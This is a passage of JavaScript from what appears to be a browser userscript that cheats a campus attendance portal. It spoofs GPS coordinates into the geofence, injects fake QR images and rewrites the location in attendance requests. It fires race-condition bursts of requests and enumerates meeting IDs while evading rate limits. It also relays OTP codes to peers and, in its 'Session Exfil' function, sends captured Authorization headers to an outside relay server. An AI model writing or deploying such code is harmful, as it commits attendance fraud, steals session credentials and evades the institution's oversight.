          line-height: 1.4;
          transition: all 0.25s ease;
          user-select: none;
        }
        #campus-presensi-hud.minimized {
          padding: 8px 12px;
          min-width: auto;
          cursor: pointer;
        }
        #campus-presensi-hud .hud-header {
          display: flex;
          align-items: center;
          justify-content: space-between;
          font-weight: 600;
          font-size: 12px;
          margin-bottom: 6px;
          color: #60a5fa;
        }
        #campus-presensi-hud.minimized .hud-body { display: none; }
        #campus-presensi-hud:not(.minimized) .hud-min-view { display: none; }
        #campus-presensi-hud .hud-pill {
          display: inline-flex;
          align-items: center;
          gap: 5px;
          padding: 3px 8px;
          border-radius: 6px;
          font-weight: 600;
          font-size: 13px;
          margin-top: 4px;
        }
        #campus-presensi-hud .hud-pill.green  { background: rgba(34, 197, 94, 0.2); color: #4ade80; }
        #campus-presensi-hud .hud-pill.yellow { background: rgba(234, 179, 8, 0.2); color: #facc15; }
        #campus-presensi-hud .hud-pill.red    { background: rgba(239, 68, 68, 0.25); color: #f87171; }
        #campus-presensi-hud .hud-sub {
          color: #9ca3af;
          font-size: 11px;
          margin-top: 4px;
        }
        #campus-presensi-hud .hud-btn-toggle {
          background: transparent;
          border: none;
          color: #9ca3af;
          cursor: pointer;
          padding: 2px 4px;
          font-size: 11px;
        }
        #campus-presensi-hud .hud-btn-toggle:hover { color: #fff; }
        #campus-presensi-hud .hud-room-badge {
          display: inline-block;
          font-size: 11px;
          color: #60a5fa;
          background: rgba(96, 165, 250, 0.15);
          border: 1px solid rgba(96, 165, 250, 0.3);
          border-radius: 4px;
          padding: 2px 6px;
          margin-top: 5px;
        }
        #campus-presensi-hud .hud-action-row {
          display: flex;
          align-items: center;
          gap: 6px;
          margin-top: 8px;
        }
        #campus-presensi-hud .hud-code-input {
          flex: 1;
          background: rgba(0, 0, 0, 0.45);
          border: 1px solid rgba(255, 255, 255, 0.2);
          border-radius: 6px;
          color: #fff;
          font-family: monospace;
          font-size: 13px;
          font-weight: 600;
          text-align: center;
          letter-spacing: 2px;
          padding: 5px 8px;
          outline: none;
          box-sizing: border-box;
          width: 100%;
        }
        #campus-presensi-hud .hud-code-input:focus {
          border-color: #60a5fa;
          box-shadow: 0 0 0 1px #60a5fa;
        }
        #campus-presensi-hud .hud-btn-checkin {
          background: #2563eb;
          color: #fff;
          border: none;
          border-radius: 6px;
          font-weight: 600;
          font-size: 11px;
          padding: 6px 10px;
          cursor: pointer;
          white-space: nowrap;
          transition: background 0.15s ease;
        }
        #campus-presensi-hud .hud-btn-checkin:hover  { background: #1d4ed8; }
        #campus-presensi-hud .hud-btn-checkin:active { background: #1e40af; }
        #campus-presensi-hud .hud-status-msg {
          font-size: 11px;
          margin-top: 5px;
          min-height: 14px;
          line-height: 1.3;
        }
      `;
      document.head.appendChild(style);

      _hudContainer.innerHTML = `
        <div class="hud-min-view" style="display:flex;align-items:center;gap:6px;">
          <span style="display:inline-block;width:7px;height:7px;border-radius:50%;background:#4ade80;"></span>
          <span class="hud-min-timer" style="font-weight:600;">--:--</span>
        </div>
        <div class="hud-body">
          <div class="hud-header">
            <span>Attendance Monitor</span>
            <button class="hud-btn-toggle" title="Minimize">—</button>
          </div>
          <div class="hud-title" style="font-weight:600;color:#fff;">Active Class</div>
          <div class="hud-pill green">--:--</div>
          <div class="hud-rule hud-sub">Tracking session...</div>
          <div class="hud-room-badge" style="display:none;"></div>
          <div class="hud-action-row">
            <input type="text" maxlength="6" class="hud-code-input" placeholder="OTP Code" title="6-digit attendance code" />
            <button class="hud-btn-checkin">Hadir</button>
            <button class="hud-btn-qr" title="Inject QR Code Image" style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);color:#fff;border-radius:6px;padding:6px 8px;cursor:pointer;font-size:11px;display:inline-flex;align-items:center;gap:4px;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg> QR</button>
            <input type="file" class="hud-qr-file" accept="image/*" style="display:none;" />
          </div>
          <div class="hud-status-msg"></div>
          <div class="hud-sub" style="border-top:1px dashed rgba(255,255,255,0.1);padding-top:4px;margin-top:6px;display:flex;justify-content:space-between;align-items:center;">
            <span>GPS: <span class="hud-spoof-status">Active</span></span>
            <span>Mesh: <span class="hud-swarm-status" style="color:#9ca3af;">Offline</span></span>
          </div>
        </div>
      `;

      _hudContainer._refs = {
        minTimer:  _hudContainer.querySelector('.hud-min-timer'),
        title:     _hudContainer.querySelector('.hud-title'),
        pill:      _hudContainer.querySelector('.hud-pill'),
        rule:      _hudContainer.querySelector('.hud-rule'),
        spoof:     _hudContainer.querySelector('.hud-spoof-status'),
        swarm:     _hudContainer.querySelector('.hud-swarm-status'),
        roomBadge: _hudContainer.querySelector('.hud-room-badge'),
        codeInput: _hudContainer.querySelector('.hud-code-input'),
        btnCheckin:_hudContainer.querySelector('.hud-btn-checkin'),
        btnQr:     _hudContainer.querySelector('.hud-btn-qr'),
        fileQr:    _hudContainer.querySelector('.hud-qr-file'),
        statusMsg: _hudContainer.querySelector('.hud-status-msg'),
      };

      document.body.appendChild(_hudContainer);

      _hudContainer.addEventListener('click', (e) => {
        if (e.target.closest('.hud-btn-toggle') || _hudContainer.classList.contains('minimized')) {
          _hudContainer.classList.toggle('minimized');
        }
      });

      const { codeInput, btnCheckin, btnQr, fileQr } = _hudContainer._refs;

      codeInput.addEventListener('click',   (e) => e.stopPropagation());
      codeInput.addEventListener('keydown', (e) => {
        e.stopPropagation();
        if (e.key === 'Enter') _triggerCheckIn();
      });

      btnCheckin.addEventListener('click', (e) => { e.stopPropagation(); _triggerCheckIn(); });

      if (btnQr && fileQr) {
        btnQr.addEventListener('click', (e) => { e.stopPropagation(); fileQr.click(); });
        fileQr.addEventListener('change', (e) => {
          e.stopPropagation();
          const file = e.target.files && e.target.files[0];
          if (file) {
            const reader = new FileReader();
            reader.onload = (revt) => {
              setVirtualQrImage(revt.target.result);
              if (_hudContainer._refs.statusMsg) {
                _hudContainer._refs.statusMsg.textContent = 'QR loaded to Virtual Cam';
                _hudContainer._refs.statusMsg.style.color = '#38bdf8';
              }
            };
            reader.readAsDataURL(file);
          }
        });
      }
    }

    if (!_hudInterval) _hudInterval = _setInterval(_renderHudTick, 1000);
    _renderHudTick();
  }

  // ── Race-Condition Burst Submission ───────────────────────────────────────
  // Fires N parallel requests within a short stagger window.
  // Uses _origFetch (pre-proxy native) to bypass the portal's own fetch interceptors.
  async function _burstCheckIn(url, payload, n) {
    const shots = [];
    for (let i = 0; i < n; i++) {
      const delay = Math.floor(Math.random() * 30); // 0–30ms jitter
      shots.push(new Promise(resolve => {
        _setTimeout(() => {
          _origFetch(url, {
            method:      'PUT',
            credentials: 'include',
            headers:     { 'Content-Type': 'application/json', 'Accept': 'application/json' },
            body:        JSON.stringify(payload)
          }).then(r => resolve({ ok: r.ok, status: r.status }))
            .catch(() => resolve({ ok: false, status: 0 }));
        }, delay);
      }));
    }
    const results = await Promise.all(shots);
    if (results.some(r => r.ok)) return true;

    // Intelligent rate-limit / contention backoff
    const hadRateLimit = results.some(r => r.status === 429);
    if (hadRateLimit) {
      await new Promise(r => _setTimeout(r, 150 + Math.floor(Math.random() * 200)));
      try {
        const retryRes = await _origFetch(url, {
          method:      'PUT',
          credentials: 'include',
          headers:     { 'Content-Type': 'application/json', 'Accept': 'application/json' },
          body:        JSON.stringify(payload)
        });
        return retryRes.ok;
      } catch (_) {
        return false;
      }
    }
    return false;
  }

  async function _triggerCheckIn() {
    const refs = _hudContainer && _hudContainer._refs;
    if (!refs) return;
    const code = (refs.codeInput.value || '').trim();
    if (!code || code.length !== 6) {
      if (refs.statusMsg) {
        refs.statusMsg.textContent = 'Masukkan 6 digit kode presensi';
        refs.statusMsg.style.color = '#f87171';
      }
      return;
    }

    if (navigator.onLine === false) {
      try {
        const tmId = (_activeMeetingData && (_activeMeetingData.id_tatap_muka || _activeMeetingData.id_tm || _activeMeetingData.id)) || null;
        sessionStorage.setItem('__presensi_pending_queue', JSON.stringify({ code, tmId, ts: Date.now() }));
      } catch (_) {}
      if (refs.statusMsg) {
        refs.statusMsg.textContent = 'Offline: Antrian tersimpan, auto-kirim saat terhubung';
        refs.statusMsg.style.color = '#f59e0b';
      }
      return;
    }

    if (refs.statusMsg) {
      refs.statusMsg.textContent = 'Memproses presensi...';
      refs.statusMsg.style.color = '#60a5fa';
    }
    refs.btnCheckin.disabled = true;
    refs.btnCheckin.style.opacity = '0.6';

    const tmId = (_activeMeetingData && (_activeMeetingData.id_tatap_muka || _activeMeetingData.id_tm || _activeMeetingData.id)) || null;
    const cfg = getSpoofConfig();
    const pos = cfg ? buildPosition(cfg.lat, cfg.lng, cfg._geofenceRadius) : { coords: { latitude: -7.287123, longitude: 112.798542 } };

    let apiSuccess = false;

    if (tmId && _origFetch) {
      const payload = {
        jenis_hadir_tm: 'L',
        kode:           code,
        latitude:       pos.coords.latitude,
        longitude:      pos.coords.longitude
      };
      const url = `/api/presensi/tm/${tmId}/mahasiswa/self`;

      // Burst: 15 parallel shots with 0–30ms stagger to exploit race conditions
      try {
        apiSuccess = await _burstCheckIn(url, payload, 15);
        if (apiSuccess) {
          if (refs.statusMsg) {
            refs.statusMsg.textContent = 'Presensi berhasil!';
            refs.statusMsg.style.color = '#4ade80';
          }
          _sendSubmitTelemetry(pos.coords.latitude, pos.coords.longitude);
          _sendResultTelemetry('accepted');
        } else {
          // Pull error from a single clean shot for messaging
          try {
            const errRes = await _origFetch(url, {
              method: 'PUT', credentials: 'include',
              headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
              body: JSON.stringify(payload)
            });
            const errData = await errRes.json().catch(() => ({}));
            const errMsg = errData.message || `Gagal HTTP ${errRes.status}`;
            if (refs.statusMsg) {
              refs.statusMsg.textContent = errMsg;
              refs.statusMsg.style.color = '#f87171';
            }
          } catch (_) {}
        }
      } catch (_) {}
    }

    // Fallback: enumerate adjacent tmIds if main one failed
    if (!apiSuccess && tmId) {
      const numId = parseInt(tmId, 10);
      if (!isNaN(numId)) {
        for (let delta = -2; delta <= 2 && !apiSuccess; delta++) {
          if (delta === 0) continue;
          const candidateId = numId + delta;
          try {
            const res = await _origFetch(`/api/presensi/tm/${candidateId}/mahasiswa/self`, {
              method:      'PUT',
              credentials: 'include',
              headers:     { 'Content-Type': 'application/json', 'Accept': 'application/json' },
              body:        JSON.stringify({
                jenis_hadir_tm: 'L',
                kode:           code,
                latitude:       pos.coords.latitude,
                longitude:      pos.coords.longitude
              })
            });
            if (res.ok) {
              apiSuccess = true;
              _sendResultTelemetry('accepted');
              if (refs.statusMsg) {
                refs.statusMsg.textContent = `Presensi berhasil (tm:${candidateId})`;
                refs.statusMsg.style.color = '#4ade80';
              }
            }
          } catch (_) {}
        }
      }
    }

    // Final fallback: DOM UI automation
    if (!apiSuccess) {
      try { _simulateDomCheckIn(code); } catch (_) {}
    }

    refs.btnCheckin.disabled = false;
    refs.btnCheckin.style.opacity = '1';
  }

  function _dispatchHumanMouseEvent(el, type) {
    try {
      const rect = el.getBoundingClientRect();
      const x = rect.left + rect.width / 2 + (Math.random() - 0.5) * 6;
      const y = rect.top + rect.height / 2 + (Math.random() - 0.5) * 4;
      el.dispatchEvent(new MouseEvent(type, {
        bubbles: true, cancelable: true, view: window,
        clientX: x, clientY: y, buttons: type === 'mousedown' ? 1 : 0
      }));
    } catch (_) {}
  }

  function _simulateHumanClick(el, done) {
    _dispatchHumanMouseEvent(el, 'mousemove');
    _dispatchHumanMouseEvent(el, 'mouseenter');
    _setTimeout(() => {
      _dispatchHumanMouseEvent(el, 'mousedown');
      _setTimeout(() => {
        _dispatchHumanMouseEvent(el, 'mouseup');
        el.click();
        if (typeof done === 'function') _setTimeout(done, 120 + Math.random() * 80);
      }, 50 + Math.random() * 50);
    }, 40 + Math.random() * 40);
  }

  function _simulateDomCheckIn(code) {
    const buttons = Array.from(document.querySelectorAll('button, a'));
    const hadirBtn = buttons.find(b => b.textContent && b.textContent.trim().toLowerCase() === 'hadir');
    if (!hadirBtn) return;

    _simulateHumanClick(hadirBtn, () => {
      const pinInputs = Array.from(document.querySelectorAll('input[data-index]'));
      if (pinInputs.length >= 6) {
        let digitIdx = 0;
        function typeNextDigit() {
          if (digitIdx >= 6) {
            _submitModal();
            return;
          }
          const input = pinInputs[digitIdx];
          const char = code[digitIdx] || '';
          input.focus();
          input.dispatchEvent(new KeyboardEvent('keydown', { key: char, bubbles: true }));
          input.value = char;
          input.dispatchEvent(new Event('input', { bubbles: true }));
          input.dispatchEvent(new Event('change', { bubbles: true }));
          input.dispatchEvent(new KeyboardEvent('keyup', { key: char, bubbles: true }));
          digitIdx++;
          _setTimeout(typeNextDigit, 60 + Math.random() * 60);
        }
        typeNextDigit();
      } else {
        const textInputs = Array.from(document.querySelectorAll('input[type="text"], input:not([type])'));
        const modalInput = textInputs.find(i => i.placeholder && /kode/i.test(i.placeholder)) || textInputs[0];
        if (modalInput) {
          modalInput.focus();
          modalInput.value = code;
          modalInput.dispatchEvent(new Event('input', { bubbles: true }));
          modalInput.dispatchEvent(new Event('change', { bubbles: true }));
          _setTimeout(_submitModal, 150 + Math.random() * 100);
        }
      }

      function _submitModal() {
        _setTimeout(() => {
          const modalButtons = Array.from(document.querySelectorAll('.chakra-modal__content button, .modal button, [role="dialog"] button'));
          const submitBtn = modalButtons.find(b => /simpan|kirim|hadir/i.test(b.textContent || ''));
          if (submitBtn) _simulateHumanClick(submitBtn);
        }, 120 + Math.random() * 80);
      }
    });
  }

  function _renderHudTick() {
    if (!_hudContainer || !_activeMeetingData || !_hudContainer._refs) return;
    const w = _activeMeetingData;
    const now = Date.now();

    let startTime = null;
    if (w.tm_mulai) {
      const s = String(w.tm_mulai).trim();
      const parsed = new Date(s.includes(' ') ? s.replace(' ', 'T') : s).getTime();
      if (!isNaN(parsed)) startTime = parsed;
    }
    if (!startTime && w.tanggal && w.jam_mulai) {
      const parsed = new Date(`${w.tanggal}T${w.jam_mulai}:00`).getTime();
      if (!isNaN(parsed)) startTime = parsed;
    }
    if (!startTime) startTime = now;

    const masa = parseInt(w.masa_berlaku || '0', 10);
    let endTime, ruleText;

    if (masa === 15) {
      endTime  = startTime + (15 * 60 * 1000);
      ruleText = 'Lecturer Option: 15 Minutes';
    } else if (masa === 30) {
      endTime  = startTime + (30 * 60 * 1000);
      ruleText = 'Lecturer Option: 30 Minutes';
    } else {
      ruleText = 'Lecturer Option: Until Class Ends';
      if (w.jam_selesai) {
        const localNow = new Date();
        const y = localNow.getFullYear();
        const m = String(localNow.getMonth() + 1).padStart(2, '0');
        const d = String(localNow.getDate()).padStart(2, '0');
        const todayStr = `${y}-${m}-${d}`;
        const parsed = new Date(`${todayStr}T${w.jam_selesai}:00`).getTime();
        endTime = !isNaN(parsed) ? parsed : (startTime + (100 * 60 * 1000));
      } else {
        endTime = startTime + (100 * 60 * 1000);
      }
    }

    const remainingSec = Math.max(0, Math.floor((endTime - now) / 1000));
    let pillClass = 'green';
    if (remainingSec < 120) pillClass = 'red';
    else if (remainingSec < 300) pillClass = 'yellow';

    const timeFormatted = _formatCountdown(remainingSec);
    const room   = w.ruangan ? ` (${w.ruangan})` : '';
    const course = w.nama_mk || 'Active Class';
    const cfg    = getSpoofConfig();
    const refs   = _hudContainer._refs;

    if (refs.minTimer) refs.minTimer.textContent = timeFormatted;
    if (refs.title)    refs.title.textContent    = `${course}${room}`;
    if (refs.pill) {
      refs.pill.className   = `hud-pill ${pillClass}`;
      refs.pill.textContent = timeFormatted;
    }
    if (refs.rule) refs.rule.textContent = ruleText;
    if (refs.roomBadge) {
      if (currentConfig && currentConfig._autoRoomMatched) {
        refs.roomBadge.style.display = 'inline-block';
        refs.roomBadge.textContent   = `Auto-Room: ${currentConfig._autoRoomMatched}`;
      } else {
        refs.roomBadge.style.display = 'none';
      }
    }
    if (refs.spoof) {
      refs.spoof.innerHTML = cfg
        ? `<span style="color:#4ade80;">Active</span>`
        : `<span style="color:#9ca3af;">Off</span>`;
    }
  }

  // ── Swarm Mesh & OTP Peer Relay ───────────────────────────────────────────
  let _swarmActive = false;
  let _swarmInterval = null;
  let _isSwarmLeader = false;
  let _lastPushedOtp = null;
  let _lastPulledOtp = null;
  let _peerId = null;

  try {
    _peerId = sessionStorage.getItem('__gps_peer') || ('p_' + Math.random().toString(36).substring(2, 9));
    sessionStorage.setItem('__gps_peer', _peerId);
  } catch (_) {
    _peerId = 'p_' + Math.random().toString(36).substring(2, 9);
  }

  function _getRelayUrl() {
    return (currentConfig && currentConfig.relayUrl) || null;
  }

  function _getRelayKey() {
    const d = _activeMeetingData;
    if (!d) return null;
    return d.id_tatap_muka || d.id_tm || d.id || null;
  }

  function _updateHudSwarmBadge() {
    if (_hudContainer && _hudContainer._refs && _hudContainer._refs.swarm) {
      const el = _hudContainer._refs.swarm;
      if (!_getRelayUrl()) {
        el.textContent = 'Disabled';
        el.style.color = '#64748b';
      } else if (_isSwarmLeader) {
        el.textContent = 'Leader';
        el.style.color = '#38bdf8';
      } else {
        el.textContent = 'Follower';
        el.style.color = '#a78bfa';
      }
    }
  }

  // ── CSP-Immune Relay Fetch Bridge (bypasses page connect-src CSP) ─────────
  function _relayFetch(url, options) {
    if (!_isPortalDomain()) return Promise.resolve({ ok: false, status: 0 });
    return new Promise((resolve) => {
      const reqId = Math.random().toString(36).substring(2, 10);
      const resEvent = '__gps_relay_res_' + reqId;
      const timer = _setTimeout(() => {
        try { _removeEventListener(resEvent, onRes, true); } catch (_) {}
        resolve({ ok: false, status: 0, json: () => Promise.resolve(null), text: () => Promise.resolve('') });
      }, 5000);

      function onRes(e) {
        try {
          _removeEventListener(resEvent, onRes, true);
          _clearTimeout(timer);
          const data = typeof e.detail === 'string' ? JSON.parse(e.detail) : e.detail;
          resolve({
            ok:     Boolean(data && data.ok),
            status: (data && data.status) || (data && data.ok ? 200 : 500),
            json:   () => Promise.resolve((data && data.data) || null),
            text:   () => Promise.resolve((data && data.text) || '')
          });
        } catch (_) {
          resolve({ ok: false, status: 0, json: () => Promise.resolve(null), text: () => Promise.resolve('') });
        }
      }

      _addEventListener(resEvent, onRes, true);
      try {
        _dispatchEvent(new _CustomEvent('__gps_relay_req', {
          detail: JSON.stringify({ reqId, url, options })
        }));
      } catch (_) {
        _clearTimeout(timer);
        resolve({ ok: false, status: 0, json: () => Promise.resolve(null), text: () => Promise.resolve('') });
      }
    });
  }

  function _pushSwarmState(stateObj) {
    const relay = _getRelayUrl();
    if (!relay || !_isPortalDomain()) return;
    _relayFetch(`${relay}/mesh/state`, {
      method:  'PUT',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify(stateObj)
    }).catch(() => {});
  }

  function _pushOtp(otp, tmKey) {
    const relay = _getRelayUrl();
    if (!relay || !tmKey || !otp || !_isPortalDomain()) return;
    if (_lastPushedOtp === otp) return;
    _lastPushedOtp = otp;
    _relayFetch(`${relay}/otp/${tmKey}`, {
      method:  'PUT',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ code: otp, otp, ts: Date.now() })
    }).catch(() => {});
  }

  function _pullOtp(tmKey) {
    const relay = _getRelayUrl();
    if (!relay || !tmKey || !_isPortalDomain()) return;
    _relayFetch(`${relay}/otp/${tmKey}`, { method: 'GET' })
      .then(r => r && r.ok ? r.json() : null)
      .then(data => {
        if (!data) return;
        const otp = String(data.code || data.otp || '');
        if (!otp || otp === _lastPulledOtp) return;
        _lastPulledOtp = otp;
        if (_hudContainer && _hudContainer._refs && _hudContainer._refs.codeInput) {
          if (!_hudContainer._refs.codeInput.value) {
            _hudContainer._refs.codeInput.value = otp;
            if (_hudContainer._refs.statusMsg) {
              refsStatus('OTP synced from peer relay', '#a78bfa');
            }
          }
        }
      })
      .catch(() => {});
  }

  function refsStatus(text, color) {
    if (_hudContainer && _hudContainer._refs && _hudContainer._refs.statusMsg) {
      _hudContainer._refs.statusMsg.textContent = text;
      _hudContainer._refs.statusMsg.style.color = color;
    }
  }

  function _swarmHeartbeat() {
    const relay = _getRelayUrl();
    if (!relay || !_isPortalDomain()) return;

    const meta = {
      domain: window.location.hostname,
      room:   (_activeMeetingData && _activeMeetingData.ruangan) || null,
      course: (_activeMeetingData && _activeMeetingData.nama_mk) || null,
      hasQr:  Boolean(_virtualQrImage),
    };

    _relayFetch(`${relay}/mesh/heartbeat/${_peerId}`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify(meta)
    })
      .then(r => r && r.ok ? r.json() : null)
      .then(data => {
        if (!data) return;
        _isSwarmLeader = Boolean(data.isLeader);
        _updateHudSwarmBadge();

        // 1. Sync OTP from swarm
        if (data.latestOtp && data.latestOtp.code) {
          const otp = String(data.latestOtp.code);
          if (otp && _hudContainer && _hudContainer._refs && _hudContainer._refs.codeInput) {
            if (!_hudContainer._refs.codeInput.value) {
              _hudContainer._refs.codeInput.value = otp;
              refsStatus('OTP synced via Swarm Mesh', '#38bdf8');
            }
          }
        }

        // 2. Sync QR from leader
        if (data.meshState && data.meshState.qrUrl && !_virtualQrImage) {
          setVirtualQrImage(data.meshState.qrUrl);
          refsStatus('QR auto-synced from Swarm Leader', '#38bdf8');
        }

        // 3. Fallback poll active tmKey if defined
        const tmKey = _getRelayKey();
        if (tmKey) _pullOtp(tmKey);
      })
      .catch(() => {});
  }

  function _startOtpPoller() {
    if (_swarmActive) return;
    if (!_isPortalDomain()) return;
    const relay = _getRelayUrl();
    if (!relay) {
      _updateHudSwarmBadge();
      return;
    }
    _swarmActive = true;
    _swarmHeartbeat();
    _swarmInterval = _setInterval(_swarmHeartbeat, 6000);
  }

  function _stopOtpPoller() {
    if (_swarmInterval) { _clearInterval(_swarmInterval); _swarmInterval = null; }
    _swarmActive = false;
    _isSwarmLeader = false;
    _updateHudSwarmBadge();
  }

  // ── tmId Background Enumerator ────────────────────────────────────────────
  // Silently discovers adjacent valid meeting IDs. Stores results in _knownTmIds.
  let _knownTmIds = new Set();
  let _tmEnumRunning = false;

  function _enumerateTmIds(baseTmId) {
    if (!baseTmId || _tmEnumRunning || !_origFetch || !_isPortalDomain()) return;
    // If connected to a swarm and not leader, let the leader handle discovery
    if (_getRelayUrl() && !_isSwarmLeader) return;

    const numId = parseInt(baseTmId, 10);
    if (isNaN(numId)) return;
    _tmEnumRunning = true;

    const candidates = [];
    for (let delta = -10; delta <= 10; delta++) {
      if (delta === 0) { _knownTmIds.add(numId); continue; }
      candidates.push(numId + delta);
    }

    let idx = 0;
    function _nextProbe() {
      if (idx >= candidates.length) { _tmEnumRunning = false; return; }
      const id = candidates[idx++];
      _origFetch(`/api/presensi/tm/${id}`, {
        method:      'GET',
        credentials: 'include',
        headers:     { 'Accept': 'application/json' }
      }).then(r => {
        if (r.status === 200) _knownTmIds.add(id);
      }).catch(() => {}).finally(() => {
        // Stagger probes: 200–600ms between each to avoid rate-limit detection
        _setTimeout(_nextProbe, 200 + Math.random() * 400);
      });
    }
    _nextProbe();
  }

  // ── Session Exfil ─────────────────────────────────────────────────────────
  // Snapshots response cookies + auth headers from presensi API responses
  // and relays them to the KV worker's /session endpoint.
  function _exfilSession(responseHeaders) {
    try {
      const authHeader = responseHeaders && responseHeaders.get && (
        responseHeaders.get('Authorization') ||
        responseHeaders.get('X-Auth-Token')  ||
        responseHeaders.get('X-Access-Token')
      );
      if (authHeader) {
        // Dispatch local telemetry for headless background auto-checkin
        try {
          _dispatchEvent(new _CustomEvent('__gps_telemetry_msg', {
            detail: JSON.stringify({
              type:   'SESSION_CAPTURED',
              auth:   authHeader,
              domain: window.location.hostname,
              ts:     Date.now()
            })
          }));
        } catch (_) {}

        const relay = _getRelayUrl();
        if (relay && _isPortalDomain()) {
          _relayFetch(`${relay}/session`, {
            method:  'PUT',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify({ auth: authHeader, ts: Date.now() })
          }).catch(() => {});
        }
      }
    } catch (_) {}
  }

  // ── Geofence Polygon Parser ────────────────────────────────────────────────
  // If the API response includes polygon/radius data, auto-place within centroid.
  function _applyGeofenceFromPayload(geoData) {
    if (!geoData || !currentConfig) return;
    // Case 1: radius + center point
    if (geoData.radius && geoData.lat && geoData.lng) {
      const r = parseFloat(geoData.radius);
      const clat = parseFloat(geoData.lat);
      const clng = parseFloat(geoData.lng);
      if (!isNaN(r) && !isNaN(clat) && !isNaN(clng)) {
        currentConfig.lat = clat;
        currentConfig.lng = clng;
        currentConfig._geofenceRadius = r;
        return;
      }
    }
    // Case 2: polygon array — compute centroid
    if (Array.isArray(geoData.polygon) && geoData.polygon.length >= 3) {
      let sumLat = 0, sumLng = 0;
      for (const pt of geoData.polygon) {
        sumLat += parseFloat(pt.lat || pt[0] || 0);
        sumLng += parseFloat(pt.lng || pt[1] || 0);
      }
      const n = geoData.polygon.length;
      currentConfig.lat = sumLat / n;
      currentConfig.lng = sumLng / n;
      // Approximate bounding radius
      let maxDist = 0;
      for (const pt of geoData.polygon) {
        const dlat = parseFloat(pt.lat || pt[0] || 0) - currentConfig.lat;
        const dlng = parseFloat(pt.lng || pt[1] || 0) - currentConfig.lng;
        const dist = Math.sqrt(dlat * dlat + dlng * dlng) * 111320;
        if (dist > maxDist) maxDist = dist;
      }
      currentConfig._geofenceRadius = maxDist;
    }
  }

  // ── Payload Sniffer ────────────────────────────────────────────────────────
  function _sniffPresensiPayload(url, rawText, responseHeaders) {
    try {
      if (!rawText || typeof rawText !== 'string') return;
      if (url.includes('/api/presensi/dashboard') || url.includes('/api/presensi/tm')) {
        const json = JSON.parse(rawText);
        let widget = null;

        if (json.data && json.data.widget)       widget = json.data.widget;
        else if (json.widget)                     widget = json.widget;
        else if (Array.isArray(json.data))        widget = json.data.find(item => item && (item.status === 'sedang_berlangsung' || item.tm_mulai)) || null;
        else if (json.data && typeof json.data === 'object') widget = json.data;

        if (widget) {
          // Geofence: look for geofence/lokasi/area keys
          const geoData = widget.geofence || widget.lokasi_geofence || widget.area || null;
          if (geoData) _applyGeofenceFromPayload(geoData);

          // Auto-room matching
          const roomCandidate = widget.ruangan || widget.nama_ruang || widget.kode_ruang || widget.nama_kelas || '';
          const matched = detectRoomPreset(roomCandidate);
          if (matched && currentConfig) {
            const latDiff = Math.abs(parseFloat(currentConfig.lat) - matched.lat);
            const lngDiff = Math.abs(parseFloat(currentConfig.lng) - matched.lng);
            if (latDiff > 0.0001 || lngDiff > 0.0001) {
              currentConfig.lat = matched.lat;
              currentConfig.lng = matched.lng;
              currentConfig._autoRoomMatched = matched.label;
              try {
                _dispatchEvent(new _CustomEvent('__gps_update_coords', {
                  detail: JSON.stringify({ lat: matched.lat, lng: matched.lng, label: matched.label })
                }));
              } catch (_) {}
            }
          }

          _createOrUpdateHud(widget);

          // OTP auto-fill + push to relay
          const otp = widget.kode || widget.pin;
          if (otp) {
            if (_hudContainer && _hudContainer._refs && _hudContainer._refs.codeInput) {
              if (!_hudContainer._refs.codeInput.value) {
                _hudContainer._refs.codeInput.value = otp;
              }
            }
            const tmKey = _getRelayKey() || widget.id_tatap_muka || widget.id_tm || widget.id;
            if (tmKey) _pushOtp(String(otp), String(tmKey));
          }

          // QR dynamic auto-inject
          const qrUrl = widget.qr_url || widget.qr || widget.qr_code_url || widget.qrcode;
          if (qrUrl && typeof qrUrl === 'string' && qrUrl.startsWith('http')) {
            setVirtualQrImage(qrUrl);
            if (_hudContainer && _hudContainer._refs && _hudContainer._refs.statusMsg) {
              _hudContainer._refs.statusMsg.textContent = 'QR auto-loaded';
              _hudContainer._refs.statusMsg.style.color = '#38bdf8';
            }
          }

          // Enumerate adjacent tmIds once we know our own
          const myTmId = widget.id_tatap_muka || widget.id_tm || widget.id;
          if (myTmId) _enumerateTmIds(myTmId);

          // Broadcast to Swarm peers if leader
          if (_isSwarmLeader && _getRelayUrl()) {
            _pushSwarmState({
              tmKey: myTmId,
              otp: otp ? String(otp) : null,
              qrUrl: qrUrl || null,
              ruangan: widget.ruangan || null,
              course: widget.nama_mk || null,
              ts: Date.now()
            });
          }

          // Session exfil
          if (responseHeaders) _exfilSession(responseHeaders);
        }
      }
    } catch (_) {}
  }

  // ── Network Interception Scope & Portal Check ─────────────────────────────
  let _networkInterceptorsInstalled = false;

  function _isPortalDomain() {
    const currentHost = window.location.hostname;
    if (!currentHost) return false;
    const targetDomain = (currentConfig && currentConfig.targetDomain) ? currentConfig.targetDomain.toLowerCase() : '';
    if (!targetDomain) return false;
    return currentHost === targetDomain || currentHost.endsWith('.' + targetDomain);
  }

  // Human-like request timing jitter to normalize behavioral pattern
  function _humanDelay() {
    return Math.floor(50 + Math.random() * 150);
  }

  function _installNetworkInterceptors() {
    if (_networkInterceptorsInstalled) return;
    if (!_isPortalDomain()) return;
    _networkInterceptorsInstalled = true;

    // ── Fetch Proxy ────────────────────────────────────────────────────────
    if (window.fetch) {
      const _localFetch = _origFetch || window.fetch;
      const fetchProxy = new Proxy(_localFetch, {
        apply(target, thisArg, args) {
          let [resource, init] = args;
          const cfg = getSpoofConfig();
          const url = typeof resource === 'string' ? resource : (resource && resource.url) || '';

          // Coordinate payload rewrite on attendance submission
          if (cfg && typeof url === 'string' && url.includes('/api/presensi/tm/') && url.includes('/mahasiswa/self')) {
            try {
              if (init && init.body && typeof init.body === 'string') {
                const parsed = JSON.parse(init.body);
                const pos = buildPosition(cfg.lat, cfg.lng, cfg._geofenceRadius);
                parsed.latitude  = pos.coords.latitude;
                parsed.longitude = pos.coords.longitude;
                init = Object.assign({}, init, { body: JSON.stringify(parsed) });
                args[1] = init;
                _sendSubmitTelemetry(pos.coords.latitude, pos.coords.longitude);
              }
            } catch (_) {}
